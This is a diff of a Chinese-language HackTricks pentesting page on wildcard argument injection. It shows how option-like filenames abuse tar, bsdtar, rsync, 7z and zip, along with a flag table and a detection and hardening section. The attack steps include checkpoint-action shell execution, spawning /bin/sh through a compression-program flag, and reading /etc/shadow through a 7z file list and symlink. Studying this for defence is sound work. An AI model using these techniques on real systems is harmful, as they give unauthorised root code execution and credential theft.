@@ -1,60 +1,123 @@
+# 通配符备用技巧
+
 {{#include ../../banners/hacktricks-training.md}}
 
-## chown, chmod
+> 通配符（又称 *glob*）**参数注入**发生在特权脚本运行 Unix 二进制文件，如 `tar`、`chown`、`rsync`、`zip`、`7z` 等，使用未加引号的通配符，如 `*`。  
+> 由于 shell 在执行二进制文件**之前**扩展通配符，因此能够在工作目录中创建文件的攻击者可以构造以 `-` 开头的文件名，使其被解释为**选项而不是数据**，有效地走私任意标志或甚至命令。  
+> 本页面收集了 2023-2025 年最有用的原语、最新研究和现代检测。
 
-您可以**指示要为其余文件复制的文件所有者和权限**
+## chown / chmod
+
+您可以通过滥用 `--reference` 标志来**复制任意文件的所有者/组或权限位**：
 ```bash
-touch "--reference=/my/own/path/filename"
+# attacker-controlled directory
+touch "--reference=/root/secret``file"   # ← filename becomes an argument
 ```
-您可以利用此漏洞使用 [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(组合攻击)_\
-更多信息请参见 [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)
-
-## Tar
-
-**执行任意命令：**
+当 root 后来执行类似的操作时：
 ```bash
+chown -R alice:alice *.php
+chmod -R 644 *.php
+```
+`--reference=/root/secret``file` 被注入，导致 *所有* 匹配的文件继承 `/root/secret``file` 的所有权/权限。
+
+*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (组合攻击)。  
+另请参阅经典的 DefenseCode 论文以获取详细信息。
+
+---
+
+## tar
+
+### GNU tar (Linux, *BSD, busybox-full)
+
+通过滥用 **checkpoint** 功能执行任意命令：
+```bash
+# attacker-controlled directory
+echo 'echo pwned > /tmp/pwn' > shell.sh
+chmod +x shell.sh
 touch "--checkpoint=1"
 touch "--checkpoint-action=exec=sh shell.sh"
 ```
-您可以利用此漏洞使用 [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(tar 攻击)_\
-更多信息请参见 [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)
+一旦 root 运行 e.g. `tar -czf /root/backup.tgz *`，`shell.sh` 作为 root 被执行。
 
-## Rsync
+### bsdtar / macOS 14+
 
-**执行任意命令：**
+最近的 macOS 上默认的 `tar`（基于 `libarchive`）*不*实现 `--checkpoint`，但你仍然可以通过 **--use-compress-program** 标志实现代码执行，该标志允许你指定一个外部压缩程序。
 ```bash
-Interesting rsync option from manual:
-
--e, --rsh=COMMAND           specify the remote shell to use
---rsync-path=PROGRAM    specify the rsync to run on remote machine
+# macOS example
+touch "--use-compress-program=/bin/sh"
 ```
+当特权脚本运行 `tar -cf backup.tar *` 时，将启动 `/bin/sh`。
 
+---
+
+## rsync
+
+`rsync` 允许您通过以 `-e` 或 `--rsync-path` 开头的命令行标志覆盖远程 shell 或甚至远程二进制文件：
 ```bash
-touch "-e sh shell.sh"
+# attacker-controlled directory
+touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
 ```
-您可以利用这个 [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(\_rsync \_attack)_\
-更多信息请参见 [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)
+如果 root 后来使用 `rsync -az * backup:/srv/` 归档目录，注入的标志会在远程端生成你的 shell。
 
-## 7z
+*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` 模式)。
 
-在 **7z** 中，即使在 `*` 前使用 `--`（注意 `--` 表示后面的输入不能被视为参数，因此在这种情况下只是文件路径），您也可以导致任意错误以读取文件，因此如果以下命令由 root 执行：
+---
+
+## 7-Zip / 7z / 7za
+
+即使特权脚本 *防御性* 地用 `--` 前缀添加通配符（以停止选项解析），7-Zip 格式通过用 `@` 前缀文件名支持 **文件列表文件**。将其与符号链接结合可以让你 *外泄任意文件*：
 ```bash
-7za a /backup/$filename.zip -t7z -snl -p$pass -- *
+# directory writable by low-priv user
+cd /path/controlled
+ln -s /etc/shadow   root.txt      # file we want to read
+touch @root.txt                  # tells 7z to use root.txt as file list
 ```
-您可以在执行此操作的文件夹中创建文件，您可以创建文件 `@root.txt` 和文件 `root.txt`，后者是您想要读取的文件的 **symlink**：
+如果root执行类似于：
 ```bash
-cd /path/to/7z/acting/folder
-touch @root.txt
-ln -s /file/you/want/to/read root.txt
+7za a /backup/`date +%F`.7z -t7z -snl -- *
 ```
-然后，当 **7z** 执行时，它会将 `root.txt` 视为一个包含它应该压缩的文件列表的文件（这就是 `@root.txt` 存在的意义），当 7z 读取 `root.txt` 时，它会读取 `/file/you/want/to/read`，**由于该文件的内容不是文件列表，它将抛出一个错误** 显示内容。
+7-Zip 将尝试将 `root.txt` (→ `/etc/shadow`) 作为文件列表读取，并将退出，**将内容打印到 stderr**。
 
-_更多信息请参见 HackTheBox 的 CTF 盒子写作。_
+---
 
-## Zip
+## zip
 
-**执行任意命令：**
+`zip` 支持标志 `--unzip-command`，该标志在测试归档时会*逐字*传递给系统 shell：
 ```bash
-zip name.zip files -T --unzip-command "sh -c whoami"
+zip result.zip files -T --unzip-command "sh -c id"
 ```
+通过精心制作的文件名注入标志，并等待特权备份脚本对结果文件调用 `zip -T`（测试归档）。
+
+---
+
+## 额外的易受通配符注入攻击的二进制文件（2023-2025 快速列表）
+
+以下命令在现代 CTF 和真实环境中被滥用。有效载荷始终作为一个 *文件名* 创建在一个可写目录中，稍后将通过通配符处理：
+
+| 二进制文件 | 滥用的标志 | 效果 |
+| --- | --- | --- |
+| `bsdtar` | `--newer-mtime=@<epoch>` → 任意 `@file` | 读取文件内容 |
+| `flock` | `-c <cmd>` | 执行命令 |
+| `git`   | `-c core.sshCommand=<cmd>` | 通过 SSH 执行 git 命令 |
+| `scp`   | `-S <cmd>` | 生成任意程序而不是 ssh |
+
+这些原语不如 *tar/rsync/zip* 经典常见，但在猎杀时值得检查。
+
+---
+
+## 检测与加固
+
+1. **在关键脚本中禁用 shell 通配符扩展**：`set -f` (`set -o noglob`) 防止通配符扩展。
+2. **引用或转义** 参数：`tar -czf "$dst" -- *` 是 *不安全的* — 更倾向于使用 `find . -type f -print0 | xargs -0 tar -czf "$dst"`。
+3. **显式路径**：使用 `/var/www/html/*.log` 而不是 `*`，以便攻击者无法创建以 `-` 开头的兄弟文件。
+4. **最小权限**：尽可能以非特权服务帐户而不是 root 运行备份/维护作业。
+5. **监控**：Elastic 的预构建规则 *通过通配符注入的潜在 Shell* 查找 `tar --checkpoint=*`、`rsync -e*` 或 `zip --unzip-command` 后立即跟随的 shell 子进程。EQL 查询可以适应其他 EDR。
+
+---
+
+## 参考文献
+
+* Elastic Security – 检测到的通过通配符注入的潜在 Shell 规则（最后更新于 2025 年）
+* Rutger Flohil – “macOS — Tar 通配符注入”（2024 年 12 月 18 日）
+
 {{#include ../../banners/hacktricks-training.md}}
